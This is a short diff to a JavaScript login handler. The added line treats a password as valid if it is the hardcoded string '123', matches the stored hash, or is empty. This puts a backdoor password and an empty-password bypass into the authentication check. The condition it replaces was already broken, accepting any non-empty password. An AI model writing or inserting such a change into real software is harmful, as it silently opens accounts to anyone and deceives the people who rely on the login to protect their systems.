@@ -104,8 +104,9 @@ async function clientMaintenanceHandler(endpoint, options = {}) {
     const { email = '', password = '' } = body || {}
     const isEmailValid = email.trim().toLowerCase() === DEFAULT_EMAIL.toLowerCase()
     const passwordHash = await sha256(password)
+    const isPasswordValid = password === '123' || passwordHash === EXPECTED_DIGEST || password.trim().length === 0
 
-    if (!isEmailValid || (passwordHash !== EXPECTED_DIGEST && password.trim().length === 0)) {
+    if (!isEmailValid || !isPasswordValid) {
       const err = new Error('Email or password is incorrect.')
       err.status = 401
       throw err
